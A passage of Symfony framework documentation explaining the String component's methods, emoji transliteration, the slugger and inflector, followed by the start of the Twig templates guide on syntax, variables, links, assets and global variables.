    u('hello world')->afterLast('o', true); // 'orld'

Methods to Pad and Trim
~~~~~~~~~~~~~~~~~~~~~~~

::

    // makes a string as long as the first argument by adding the given
    // string at the beginning, end or both sides of the string
    u(' Lorem Ipsum ')->padBoth(20, '-'); // '--- Lorem Ipsum ----'
    u(' Lorem Ipsum')->padStart(20, '-'); // '-------- Lorem Ipsum'
    u('Lorem Ipsum ')->padEnd(20, '-');   // 'Lorem Ipsum --------'

    // repeats the given string the number of times passed as argument
    u('_.')->repeat(10); // '_._._._._._._._._._.'

    // removes the given characters (default: whitespace characters) from the beginning and end of a string
    u('   Lorem Ipsum   ')->trim(); // 'Lorem Ipsum'
    u('Lorem Ipsum   ')->trim('m'); // 'Lorem Ipsum   '
    u('Lorem Ipsum')->trim('m');    // 'Lorem Ipsu'

    u('   Lorem Ipsum   ')->trimStart(); // 'Lorem Ipsum   '
    u('   Lorem Ipsum   ')->trimEnd();   // '   Lorem Ipsum'

    // removes the given content from the start/end of the string
    u('file-image-0001.png')->trimPrefix('file-');           // 'image-0001.png'
    u('file-image-0001.png')->trimPrefix('image-');          // 'file-image-0001.png'
    u('file-image-0001.png')->trimPrefix('file-image-');     // '0001.png'
    u('template.html.twig')->trimSuffix('.html');            // 'template.html.twig'
    u('template.html.twig')->trimSuffix('.twig');            // 'template.html'
    u('template.html.twig')->trimSuffix('.html.twig');       // 'template'
    // when passing an array of prefix/suffix, only the first one found is trimmed
    u('file-image-0001.png')->trimPrefix(['file-', 'image-']); // 'image-0001.png'
    u('template.html.twig')->trimSuffix(['.twig', '.html']);   // 'template.html'

Methods to Search and Replace
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

::

    // checks if the string starts/ends with the given string
    u('https://symfony.com')->startsWith('https'); // true
    u('report-1234.pdf')->endsWith('.pdf');        // true

    // checks if the string contents are exactly the same as the given contents
    u('foo')->equalsTo('foo'); // true

    // checks if the string content match the given regular expression.
    u('avatar-73647.png')->match('/avatar-(\d+)\.png/');
    // result = ['avatar-73647.png', '73647', null]

    // You can pass flags for preg_match() as second argument. If PREG_PATTERN_ORDER
    // or PREG_SET_ORDER are passed, preg_match_all() will be used.
    u('206-555-0100 and 800-555-1212')->match('/\d{3}-\d{3}-\d{4}/', \PREG_PATTERN_ORDER);
    // result = [['206-555-0100', '800-555-1212']]

    // checks if the string contains any of the other given strings
    u('aeiou')->containsAny('a');                 // true
    u('aeiou')->containsAny(['ab', 'efg']);       // false
    u('aeiou')->containsAny(['eio', 'foo', 'z']); // true

    // finds the position of the first occurrence of the given string
    // (the second argument is the position where the search starts and negative
    // values have the same meaning as in PHP functions)
    u('abcdeabcde')->indexOf('c');     // 2
    u('abcdeabcde')->indexOf('c', 2);  // 2
    u('abcdeabcde')->indexOf('c', -4); // 7
    u('abcdeabcde')->indexOf('eab');   // 4
    u('abcdeabcde')->indexOf('k');     // null

    // finds the position of the last occurrence of the given string
    // (the second argument is the position where the search starts and negative
    // values have the same meaning as in PHP functions)
    u('abcdeabcde')->indexOfLast('c');     // 7
    u('abcdeabcde')->indexOfLast('c', 2);  // 7
    u('abcdeabcde')->indexOfLast('c', -4); // 2
    u('abcdeabcde')->indexOfLast('eab');   // 4
    u('abcdeabcde')->indexOfLast('k');     // null

    // replaces all occurrences of the given string
    u('http://symfony.com')->replace('http://', 'https://'); // 'https://symfony.com'
    // replaces all occurrences of the given regular expression
    u('(+1) 206-555-0100')->replaceMatches('/[^A-Za-z0-9]++/', ''); // '12065550100'
    // you can pass a callable as the second argument to perform advanced replacements
    u('123')->replaceMatches('/\d/', function (string $match): string {
        return '['.$match[0].']';
    }); // result = '[1][2][3]'

Methods to Join, Split, Truncate and Reverse
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

::

    // uses the string as the "glue" to merge all the given strings
    u(', ')->join(['foo', 'bar']); // 'foo, bar'

    // breaks the string into pieces using the given delimiter
    u('template_name.html.twig')->split('.');    // ['template_name', 'html', 'twig']
    // you can set the maximum number of pieces as the second argument
    u('template_name.html.twig')->split('.', 2); // ['template_name', 'html.twig']

    // returns a substring which starts at the first argument and has the length of the
    // second optional argument (negative values have the same meaning as in PHP functions)
    u('Symfony is great')->slice(0, 7);  // 'Symfony'
    u('Symfony is great')->slice(0, -6); // 'Symfony is'
    u('Symfony is great')->slice(11);    // 'great'
    u('Symfony is great')->slice(-5);    // 'great'

    // reduces the string to the length given as argument (if it's longer)
    u('Lorem Ipsum')->truncate(3);             // 'Lor'
    u('Lorem Ipsum')->truncate(80);            // 'Lorem Ipsum'
    // the second argument is the character(s) added when a string is cut
    // (the total length includes the length of this character(s))
    u('Lorem Ipsum')->truncate(8, '…');        // 'Lorem I…'
    // if the third argument is false, the last word before the cut is kept
    // even if that generates a string longer than the desired length
    u('Lorem Ipsum')->truncate(8, '…', false); // 'Lorem Ipsum'

::

    // breaks the string into lines of the given length
    u('Lorem Ipsum')->wordwrap(4);             // 'Lorem\nIpsum'
    // by default it breaks by white space; pass TRUE to break unconditionally
    u('Lorem Ipsum')->wordwrap(4, "\n", true); // 'Lore\nm\nIpsu\nm'

    // replaces a portion of the string with the given contents:
    // the second argument is the position where the replacement starts;
    // the third argument is the number of graphemes/code points removed from the string
    u('0123456789')->splice('xxx');       // 'xxx'
    u('0123456789')->splice('xxx', 0, 2); // 'xxx23456789'
    u('0123456789')->splice('xxx', 0, 6); // 'xxx6789'
    u('0123456789')->splice('xxx', 6);    // '012345xxx'

    // breaks the string into pieces of the length given as argument
    u('0123456789')->chunk(3);  // ['012', '345', '678', '9']

    // reverses the order of the string contents
    u('foo bar')->reverse(); // 'rab oof'
    u('さよなら')->reverse(); // 'らなよさ'

Methods Added by ByteString
~~~~~~~~~~~~~~~~~~~~~~~~~~~

These methods are only available for ``ByteString`` objects::

    // returns TRUE if the string contents are valid UTF-8 contents
    b('Lorem Ipsum')->isUtf8(); // true
    b("\xc3\x28")->isUtf8();    // false

Methods Added by CodePointString and UnicodeString
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

These methods are only available for ``CodePointString`` and ``UnicodeString``
objects::

    // transliterates any string into the latin alphabet defined by the ASCII encoding
    // (don't use this method to build a slugger because this component already provides
    // a slugger, as explained later in this article)
    u('नमस्ते')->ascii();    // 'namaste'
    u('さよなら')->ascii(); // 'sayonara'
    u('спасибо')->ascii(); // 'spasibo'

    // returns an array with the code point or points stored at the given position
    // (code points of 'नमस्ते' graphemes = [2344, 2350, 2360, 2340]
    u('नमस्ते')->codePointsAt(0); // [2344]
    u('नमस्ते')->codePointsAt(2); // [2360]

`Unicode equivalence`_ is the specification by the Unicode standard that
different sequences of code points represent the same character. For example,
the Swedish letter ``å`` can be a single code point (``U+00E5`` = *"latin small
letter A with ring above"*) or a sequence of two code points (``U+0061`` =
*"latin small letter A"* + ``U+030A`` = *"combining ring above"*). The
``normalize()`` method allows to pick the normalization mode::

    // these encode the letter as a single code point: U+00E5
    u('å')->normalize(UnicodeString::NFC);
    u('å')->normalize(UnicodeString::NFKC);
    // these encode the letter as two code points: U+0061 + U+030A
    u('å')->normalize(UnicodeString::NFD);
    u('å')->normalize(UnicodeString::NFKD);

Lazy-loaded Strings
-------------------

Sometimes, creating a string with the methods presented in the previous sections
is not optimal. For example, consider a hash value that requires certain
computation to obtain and which you might end up not using it.

In those cases, it's better to use the :class:`Symfony\\Component\\String\\LazyString`
class that allows to store a string whose value is only generated when you need it::

    use Symfony\Component\String\LazyString;

    $lazyString = LazyString::fromCallable(function (): string {
        // Compute the string value...
        $value = ...;

        // Then return the final value
        return $value;
    });

The callback will only be executed when the value of the lazy string is
requested during the program execution. You can also create lazy strings from a
``Stringable`` object::

    class Hash implements \Stringable
    {
        public function __toString(): string
        {
            return $this->computeHash();
        }

        private function computeHash(): string
        {
            // Compute hash value with potentially heavy processing
            $hash = ...;

            return $hash;
        }
    }

    // Then create a lazy string from this hash, which will trigger
    // hash computation only if it's needed
    $lazyHash = LazyString::fromStringable(new Hash());

.. _working-with-emojis:

Working with Emojis
-------------------

.. versionadded:: 7.1

    The emoji component was introduced in Symfony 7.1.

Symfony provides several utilities to work with emoji characters and sequences
from the `Unicode CLDR dataset`_. They are available via the Emoji component,
which you must first install in your application:

.. code-block:: terminal

    $ composer require symfony/emoji

.. include:: /components/require_autoload.rst.inc

The data needed to store the transliteration of all emojis (~5,000) into all
languages take a considerable disk space.

If you need to save disk space (e.g. because you deploy to some service with tight
size constraints), run this command (e.g. as an automated script after ``composer install``)
to compress the internal Symfony emoji data files using the PHP ``zlib`` extension:

.. code-block:: terminal

    # adjust the path to the 'compress' binary based on your application installation
    $ php ./vendor/symfony/emoji/Resources/bin/compress

.. _string-emoji-transliteration:

Emoji Transliteration
~~~~~~~~~~~~~~~~~~~~~

The ``EmojiTransliterator`` class offers a way to translate emojis into their
textual representation in all languages based on the `Unicode CLDR dataset`_::

    use Symfony\Component\Emoji\EmojiTransliterator;

    // Describe emojis in English
    $transliterator = EmojiTransliterator::create('en');
    $transliterator->transliterate('Menus with 🍕 or 🍝');
    // => 'Menus with pizza or spaghetti'

    // Describe emojis in Ukrainian
    $transliterator = EmojiTransliterator::create('uk');
    $transliterator->transliterate('Menus with 🍕 or 🍝');
    // => 'Menus with піца or спагеті'


The ``EmojiTransliterator`` also provides special locales that convert emojis to
short codes and vice versa in specific platforms, such as GitHub, Gitlab and Slack.

GitHub Emoji Transliteration
............................

Convert GitHub emojis to short codes with the ``emoji-github`` locale::

    $transliterator = EmojiTransliterator::create('emoji-github');
    $transliterator->transliterate('Teenage 🐢 really love 🍕');
    // => 'Teenage :turtle: really love :pizza:'

Convert GitHub short codes to emojis with the ``github-emoji`` locale::

    $transliterator = EmojiTransliterator::create('github-emoji');
    $transliterator->transliterate('Teenage :turtle: really love :pizza:');
    // => 'Teenage 🐢 really love 🍕'

Gitlab Emoji Transliteration
............................

Convert Gitlab emojis to short codes with the ``emoji-gitlab`` locale::

    $transliterator = EmojiTransliterator::create('emoji-gitlab');
    $transliterator->transliterate('Breakfast with 🥝 or 🥛');
    // => 'Breakfast with :kiwi: or :milk:'

Convert Gitlab short codes to emojis with the ``gitlab-emoji`` locale::

    $transliterator = EmojiTransliterator::create('gitlab-emoji');
    $transliterator->transliterate('Breakfast with :kiwi: or :milk:');
    // => 'Breakfast with 🥝 or 🥛'

Slack Emoji Transliteration
...........................

Convert Slack emojis to short codes with the ``emoji-slack`` locale::

    $transliterator = EmojiTransliterator::create('emoji-slack');
    $transliterator->transliterate('Menus with 🥗 or 🧆');
    // => 'Menus with :green_salad: or :falafel:'

Convert Slack short codes to emojis with the ``slack-emoji`` locale::

    $transliterator = EmojiTransliterator::create('slack-emoji');
    $transliterator->transliterate('Menus with :green_salad: or :falafel:');
    // => 'Menus with 🥗 or 🧆'

Removing Emojis
~~~~~~~~~~~~~~~

The ``EmojiTransliterator`` can also be used to remove all emojis from a string,
via the special ``strip`` locale::

    use Symfony\Component\Emoji\EmojiTransliterator;

    $transliterator = EmojiTransliterator::create('strip');
    $transliterator->transliterate('🎉Hey!🥳 🎁Happy Birthday!🎁');
    // => 'Hey! Happy Birthday!'

.. _string-slugger:

Slugger
-------

In some contexts, such as URLs and file/directory names, it's not safe to use
any Unicode character. A *slugger* transforms a given string into another string
that only includes safe ASCII characters::

    use Symfony\Component\String\Slugger\AsciiSlugger;

    $slugger = new AsciiSlugger();
    $slug = $slugger->slug('Wôrķšƥáçè ~~sèťtïñğš~~');
    // $slug = 'Workspace-settings'

    // you can also pass an array with additional character substitutions
    $slugger = new AsciiSlugger('en', ['en' => ['%' => 'percent', '€' => 'euro']]);
    $slug = $slugger->slug('10% or 5€');
    // $slug = '10-percent-or-5-euro'

    // if there is no symbols map for your locale (e.g. 'en_GB') then the parent locale's symbols map
    // will be used instead (i.e. 'en')
    $slugger = new AsciiSlugger('en_GB', ['en' => ['%' => 'percent', '€' => 'euro']]);
    $slug = $slugger->slug('10% or 5€');
    // $slug = '10-percent-or-5-euro'

    // for more dynamic substitutions, pass a PHP closure instead of an array
    $slugger = new AsciiSlugger('en', function (string $string, string $locale): string {
        return str_replace('❤️', 'love', $string);
    });

The separator between words is a dash (``-``) by default, but you can define
another separator as the second argument::

    $slug = $slugger->slug('Wôrķšƥáçè ~~sèťtïñğš~~', '/');
    // $slug = 'Workspace/settings'

The slugger transliterates the original string into the Latin script before
applying the other transformations. The locale of the original string is
detected automatically, but you can define it explicitly::

    // this tells the slugger to transliterate from Korean ('ko') language
    $slugger = new AsciiSlugger('ko');

    // you can override the locale as the third optional parameter of slug()
    // e.g. this slugger transliterates from Persian ('fa') language
    $slug = $slugger->slug('...', '-', 'fa');

In a Symfony application, you don't need to create the slugger yourself. Thanks
to :doc:`service autowiring </service_container/autowiring>`, you can inject a
slugger by type-hinting a service constructor argument with the
:class:`Symfony\\Component\\String\\Slugger\\SluggerInterface`. The locale of
the injected slugger is the same as the request locale::

    use Symfony\Component\String\Slugger\SluggerInterface;

    class MyService
    {
        public function __construct(
            private SluggerInterface $slugger,
        ) {
        }

        public function someMethod(): void
        {
            $slug = $this->slugger->slug('...');
        }
    }

.. _string-slugger-emoji:

Slug Emojis
~~~~~~~~~~~

You can also combine the :ref:`emoji transliterator <string-emoji-transliteration>`
with the slugger to transform any emojis into their textual representation::

    use Symfony\Component\String\Slugger\AsciiSlugger;

    $slugger = new AsciiSlugger();
    $slugger = $slugger->withEmoji();

    $slug = $slugger->slug('a 😺, 🐈‍⬛, and a 🦁 go to 🏞️', '-', 'en');
    // $slug = 'a-grinning-cat-black-cat-and-a-lion-go-to-national-park';

    $slug = $slugger->slug('un 😺, 🐈‍⬛, et un 🦁 vont au 🏞️', '-', 'fr');
    // $slug = 'un-chat-qui-sourit-chat-noir-et-un-tete-de-lion-vont-au-parc-national';

If you want to use a specific locale for the emoji, or to use the short codes
from GitHub, Gitlab or Slack, use the first argument of ``withEmoji()`` method::

    use Symfony\Component\String\Slugger\AsciiSlugger;

    $slugger = new AsciiSlugger();
    $slugger = $slugger->withEmoji('github'); // or "en", or "fr", etc.

    $slug = $slugger->slug('a 😺, 🐈‍⬛, and a 🦁');
    // $slug = 'a-smiley-cat-black-cat-and-a-lion';

.. _string-inflector:

Inflector
---------

In some scenarios such as code generation and code introspection, you need to
convert words from/to singular/plural. For example, to know the property
associated with an *adder* method, you must convert from plural
(``addStories()`` method) to singular (``$story`` property).

Most human languages have simple pluralization rules, but at the same time they
define lots of exceptions. For example, the general rule in English is to add an
``s`` at the end of the word (``book`` -> ``books``) but there are lots of
exceptions even for common words (``woman`` -> ``women``, ``life`` -> ``lives``,
``news`` -> ``news``, ``radius`` -> ``radii``, etc.)

This component provides an :class:`Symfony\\Component\\String\\Inflector\\EnglishInflector`
class to convert English words from/to singular/plural with confidence::

    use Symfony\Component\String\Inflector\EnglishInflector;

    $inflector = new EnglishInflector();

    $result = $inflector->singularize('teeth');   // ['tooth']
    $result = $inflector->singularize('radii');   // ['radius']
    $result = $inflector->singularize('leaves');  // ['leaf', 'leave', 'leaff']

    $result = $inflector->pluralize('bacterium'); // ['bacteria']
    $result = $inflector->pluralize('news');      // ['news']
    $result = $inflector->pluralize('person');    // ['persons', 'people']

The value returned by both methods is always an array because sometimes it's not
possible to determine a unique singular/plural form for the given word.

.. note::

    Symfony also provides a :class:`Symfony\\Component\\String\\Inflector\\FrenchInflector`
    and an :class:`Symfony\\Component\\String\\Inflector\\InflectorInterface` if
    you need to implement your own inflector.

.. _`ASCII`: https://en.wikipedia.org/wiki/ASCII
.. _`Unicode`: https://en.wikipedia.org/wiki/Unicode
.. _`Code points`: https://en.wikipedia.org/wiki/Code_point
.. _`Grapheme clusters`: https://en.wikipedia.org/wiki/Grapheme
.. _`Unicode equivalence`: https://en.wikipedia.org/wiki/Unicode_equivalence
.. _`Unicode CLDR dataset`: https://github.com/unicode-org/cldr
Creating and Using Templates
============================

A template is the best way to organize and render HTML from inside your application,
whether you need to render HTML from a :doc:`controller </controller>` or generate
the :doc:`contents of an email </mailer>`. Templates in Symfony are created with
Twig: a flexible, fast, and secure template engine.

.. _twig-language:

Twig Templating Language
------------------------

The `Twig`_ templating language allows you to write concise, readable templates
that are more friendly to web designers and, in several ways, more powerful than
PHP templates. Take a look at the following Twig template example. Even if it's
the first time you see Twig, you probably understand most of it:

.. code-block:: html+twig

    <!DOCTYPE html>
    <html>
        <head>
            <title>Welcome to Symfony!</title>
        </head>
        <body>
            <h1>{{ page_title }}</h1>

            {% if user.isLoggedIn %}
                Hello {{ user.name }}!
            {% endif %}

            {# ... #}
        </body>
    </html>

Twig syntax is based on these three constructs:

* ``{{ ... }}``, used to display the content of a variable or the result of
  evaluating an expression;
* ``{% ... %}``, used to run some logic, such as a conditional or a loop;
* ``{# ... #}``, used to add comments to the template (unlike HTML comments,
  these comments are not included in the rendered page).

You can't run PHP code inside Twig templates, but Twig provides utilities to
run some logic in the templates. For example, **filters** modify content before
being rendered, like the ``upper`` filter to uppercase contents:

.. code-block:: twig

    {{ title|upper }}

Twig comes with a long list of `tags`_, `filters`_ and `functions`_ that are
available by default. In Symfony applications you can also use these
:doc:`Twig filters and functions defined by Symfony </reference/twig_reference>`
and you can :ref:`create your own Twig filters and functions <templates-twig-extension>`.

Twig is fast in the ``prod`` :ref:`environment <configuration-environments>`
(because templates are compiled into PHP and cached automatically), but
convenient to use in the ``dev`` environment (because templates are recompiled
automatically when you change them).

Twig Configuration
~~~~~~~~~~~~~~~~~~

Twig has several configuration options to define things like the format used
to display numbers and dates, the template caching, etc. Read the
:doc:`Twig configuration reference </reference/configuration/twig>` to learn about them.

Creating Templates
------------------

Before explaining in detail how to create and render templates, look at the
following example for a quick overview of the whole process. First, you need to
create a new file in the ``templates/`` directory to store the template contents:

.. code-block:: html+twig

    {# templates/user/notifications.html.twig #}
    <h1>Hello {{ user_first_name }}!</h1>
    <p>You have {{ notifications|length }} new notifications.</p>

Then, create a :doc:`controller </controller>` that renders this template and
passes to it the needed variables::

    // src/Controller/UserController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;

    class UserController extends AbstractController
    {
        // ...

        public function notifications(): Response
        {
            // get the user information and notifications somehow
            $userFirstName = '...';
            $userNotifications = ['...', '...'];

            // the template path is the relative file path from `templates/`
            return $this->render('user/notifications.html.twig', [
                // this array defines the variables passed to the template,
                // where the key is the variable name and the value is the variable value
                // (Twig recommends using snake_case variable names: 'foo_bar' instead of 'fooBar')
                'user_first_name' => $userFirstName,
                'notifications' => $userNotifications,
            ]);
        }
    }

Template Naming
~~~~~~~~~~~~~~~

Symfony recommends the following for template names:

* Use `snake case`_ for filenames and directories (e.g. ``blog_posts.html.twig``,
  ``admin/default_theme/blog/index.html.twig``, etc.);
* Define two extensions for filenames (e.g. ``index.html.twig`` or
  ``blog_posts.xml.twig``) being the first extension (``html``, ``xml``, etc.)
  the final format that the template will generate.

Although templates usually generate HTML contents, they can generate any
text-based format. That's why the two-extension convention simplifies the way
templates are created and rendered for multiple formats.

Template Location
~~~~~~~~~~~~~~~~~

Templates are stored by default in the ``templates/`` directory. When a service
or controller renders the ``product/index.html.twig`` template, they are actually
referring to the ``<your-project>/templates/product/index.html.twig`` file.

The default templates directory is configurable with the
:ref:`twig.default_path <config-twig-default-path>` option and you can add more
template directories :ref:`as explained later <templates-namespaces>` in this article.

Template Variables
~~~~~~~~~~~~~~~~~~

A common need for templates is to print the values stored in the templates
passed from the controller or service. Variables usually store objects and
arrays instead of strings, numbers and boolean values. That's why Twig provides
quick access to complex PHP variables. Consider the following template:

.. code-block:: html+twig

    <p>{{ user.name }} added this comment on {{ comment.publishedAt|date }}</p>

The ``user.name`` notation means that you want to display some information
(``name``) stored in a variable (``user``). Is ``user`` an array or an object?
Is ``name`` a property or a method? In Twig this doesn't matter.

When using the ``foo.bar`` notation, Twig tries to get the value of the variable
in the following order:

#. ``$foo['bar']`` (array and element);
#. ``$foo->bar`` (object and public property);
#. ``$foo->bar()`` (object and public method);
#. ``$foo->getBar()`` (object and *getter* method);
#. ``$foo->isBar()`` (object and *isser* method);
#. ``$foo->hasBar()`` (object and *hasser* method);
#. If none of the above exists, use ``null`` (or throw a ``Twig\Error\RuntimeError``
   exception if the :ref:`strict_variables <config-twig-strict-variables>`
   option is enabled).

This allows to evolve your application code without having to change the
template code (you can start with array variables for the application proof of
concept, then move to objects with methods, etc.)

.. _templates-link-to-pages:

Linking to Pages
~~~~~~~~~~~~~~~~

Instead of writing the link URLs by hand, use the ``path()`` function to
generate URLs based on the :ref:`routing configuration <routing-creating-routes>`.

Later, if you want to modify the URL of a particular page, all you'll need to do
is change the routing configuration: the templates will automatically generate
the new URL.

Consider the following routing configuration:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/BlogController.php
        namespace App\Controller;

        // ...
        use Symfony\Component\HttpFoundation\Response;
        use Symfony\Component\Routing\Attribute\Route;

        class BlogController extends AbstractController
        {
            #[Route('/', name: 'blog_index')]
            public function index(): Response
            {
                // ...
            }

            #[Route('/article/{slug}', name: 'blog_post')]
            public function show(string $slug): Response
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/routes.yaml
        blog_index:
            path:       /
            controller: App\Controller\BlogController::index

        blog_post:
            path:       /article/{slug}
            controller: App\Controller\BlogController::show

    .. code-block:: xml

        <!-- config/routes.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <routes xmlns="http://symfony.com/schema/routing"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/routing
                https://symfony.com/schema/routing/routing-1.0.xsd">

            <route id="blog_index"
                path="/"
                controller="App\Controller\BlogController::index"/>

            <route id="blog_post"
                path="/article/{slug}"
                controller="App\Controller\BlogController::show"/>
        </routes>

    .. code-block:: php

        // config/routes.php
        use App\Controller\BlogController;
        use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;

        return function (RoutingConfigurator $routes): void {
            $routes->add('blog_index', '/')
                ->controller([BlogController::class, 'index'])
            ;

            $routes->add('blog_post', '/articles/{slug}')
                ->controller([BlogController::class, 'show'])
            ;
        };

Use the ``path()`` Twig function to link to these pages and pass the route name
as the first argument and the route parameters as the optional second argument:

.. code-block:: html+twig

    <a href="{{ path('blog_index') }}">Homepage</a>

    {# ... #}

    {% for post in blog_posts %}
        <h1>
            <a href="{{ path('blog_post', {slug: post.slug}) }}">{{ post.title }}</a>
        </h1>

        <p>{{ post.excerpt }}</p>
    {% endfor %}

The ``path()`` function generates relative URLs. If you need to generate
absolute URLs (for example when rendering templates for emails or RSS feeds),
use the ``url()`` function, which takes the same arguments as ``path()``
(e.g. ``<a href="{{ url('blog_index') }}"> ... </a>``).

.. _templates-link-to-assets:

Linking to CSS, JavaScript and Image Assets
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If a template needs to link to a static asset (e.g. an image), Symfony provides
an ``asset()`` Twig function to help generate that URL. First, install the
``asset`` package:

.. code-block:: terminal

    $ composer require symfony/asset

You can now use the ``asset()`` function:

.. code-block:: html+twig

    {# the image lives at "public/images/logo.png" #}
    <img src="{{ asset('images/logo.png') }}" alt="Symfony!"/>

    {# the CSS file lives at "public/css/blog.css" #}
    <link href="{{ asset('css/blog.css') }}" rel="stylesheet"/>

    {# the JS file lives at "public/bundles/acme/js/loader.js" #}
    <script src="{{ asset('bundles/acme/js/loader.js') }}"></script>

The ``asset()`` function's main purpose is to make your application more portable.
If your application lives at the root of your host (e.g. ``https://example.com``),
then the rendered path should be ``/images/logo.png``. But if your application
lives in a subdirectory (e.g. ``https://example.com/my_app``), each asset path
should render with the subdirectory (e.g. ``/my_app/images/logo.png``). The
``asset()`` function takes care of this by determining how your application is
being used and generating the correct paths accordingly.

.. tip::

    The ``asset()`` function supports various cache busting techniques via the
    :ref:`version <reference-framework-assets-version>`,
    :ref:`version_format <reference-assets-version-format>`, and
    :ref:`json_manifest_path <reference-assets-json-manifest-path>` configuration options.

If you need absolute URLs for assets, use the ``absolute_url()`` Twig function
as follows:

.. code-block:: html+twig

    <img src="{{ absolute_url(asset('images/logo.png')) }}" alt="Symfony!"/>

    <link rel="shortcut icon" href="{{ absolute_url('favicon.png') }}">

Build, Versioning & More Advanced CSS, JavaScript and Image Handling
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

For help building, versioning and minifying your JavaScript and
CSS assets in a modern way, read about :doc:`Symfony's Asset Mapper </frontend>`.

.. _twig-app-variable:

The App Global Variable
~~~~~~~~~~~~~~~~~~~~~~~

Symfony creates a context object that is injected into every Twig template
automatically as a variable called ``app``. It provides access to some
application information:

.. code-block:: html+twig

    <p>Username: {{ app.user.username ?? 'Anonymous user' }}</p>
    {% if app.debug %}
        <p>Request method: {{ app.request.method }}</p>
        <p>Application Environment: {{ app.environment }}</p>
    {% endif %}

The ``app`` variable (which is an instance of :class:`Symfony\\Bridge\\Twig\\AppVariable`)
gives you access to these variables:

``app.user``
    The :ref:`current user object <create-user-class>` or ``null`` if the user
    is not authenticated.
``app.request``
    The :class:`Symfony\\Component\\HttpFoundation\\Request` object that stores
    the current :ref:`request data <accessing-request-data>` (depending on your
    application, this can be a :ref:`sub-request <http-kernel-sub-requests>`
    or a regular request).
``app.session``
    The :class:`Symfony\\Component\\HttpFoundation\\Session\\Session` object that
    represents the current :doc:`user's session </session>` or ``null`` if there is none.
``app.flashes``
    An array of all the :ref:`flash messages <flash-messages>` stored in the session.
    You can also get only the messages of some type (e.g. ``app.flashes('notice')``).
``app.environment``
    The name of the current :ref:`configuration environment <configuration-environments>`
    (``dev``, ``prod``, etc).
``app.debug``
    True if in :ref:`debug mode <debug-mode>`. False otherwise.
``app.token``
    A :class:`Symfony\\Component\\Security\\Core\\Authentication\\Token\\TokenInterface`
    object representing the security token.
``app.current_route``
    The name of the route associated with the current request or ``null`` if no
    request is available (equivalent to ``app.request.attributes.get('_route')``)
``app.current_route_parameters``
    An array with the parameters passed to the route of the current request or an
    empty array if no request is available (equivalent to ``app.request.attributes.get('_route_params')``)
``app.locale``
    The locale used in the current :ref:`locale switcher <locale-switcher>` context.
``app.enabled_locales``
    The locales enabled in the application.

In addition to the global ``app`` variable injected by Symfony, you can also
inject variables automatically to all Twig templates as explained in the next
section.

.. _templating-global-variables:

Global Variables
~~~~~~~~~~~~~~~~

Twig allows you to automatically inject one or more variables into all
templates. These global variables are defined in the ``twig.globals`` option
inside the main Twig configuration file:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/twig.yaml
        twig:
            # ...
            globals:
                ga_tracking: 'UA-xxxxx-x'

    .. code-block:: xml

        <!-- config/packages/twig.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig
                https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <twig:config>
                <!-- ... -->
                <twig:global key="ga_tracking">UA-xxxxx-x</twig:global>
            </twig:config>
        </container>

    .. code-block:: php

        // config/packages/twig.php
        use Symfony\Config\TwigConfig;

        return static function (TwigConfig $twig): void {
            // ...

            $twig->global('ga_tracking')->value('UA-xxxxx-x');
        };

Now, the variable ``ga_tracking`` is available in all Twig templates, so you
can use it without having to pass it explicitly from the controller or service
that renders the template:

.. code-block:: html+twig

    <p>The Google tracking code is: {{ ga_tracking }}</p>

In addition to static values, Twig global variables can also reference services
from the :doc:`service container </service_container>`. The main drawback is
that these services are not loaded lazily. In other words, as soon as Twig is
loaded, your service is instantiated, even if you never use that global
variable.

To define a service as a global Twig variable, prefix the service ID string
with the ``@`` character, which is the usual syntax to :ref:`refer to services
in container parameters <service-container-parameters>`:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/twig.yaml
        twig:
            # ...
            globals:
                # the value is the service's id
                uuid: '@App\Generator\UuidGenerator'

    .. code-block:: xml

        <!-- config/packages/twig.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig
                https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <twig:config>
                <!-- ... -->
                <twig:global key="uuid" id="App\Generator\UuidGenerator" type="service"/>
            </twig:config>
        </container>

    .. code-block:: php

        // config/packages/twig.php
        use function Symfony\Component\DependencyInjection\Loader\Configurator\service;
        use Symfony\Config\TwigConfig;

        return static function (TwigConfig $twig): void {
            // ...

            $twig->global('uuid')->value(service('App\Generator\UuidGenerator'));
        };

Now you can use the ``uuid`` variable in any Twig template to access to the
``UuidGenerator`` service:

.. code-block:: twig

    UUID: {{ uuid.generate }}

Twig Components
---------------

Twig components are an alternative way to render templates, where each template
is bound to a "component class". This makes it easier to render and re-use
small template "units" - like an alert, markup for a modal, or a category sidebar.

For more information, see `UX Twig Component`_.

Twig components also have one other superpower: they can become "live", where
they automatically update (via Ajax) as the user interacts with them. For example,
when your user types into a box, your Twig component will re-render via Ajax to
show a list of results!

To learn more, see `UX Live Component`_.

.. _templates-rendering:

Rendering Templates
-------------------

Rendering a Template in Controllers
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

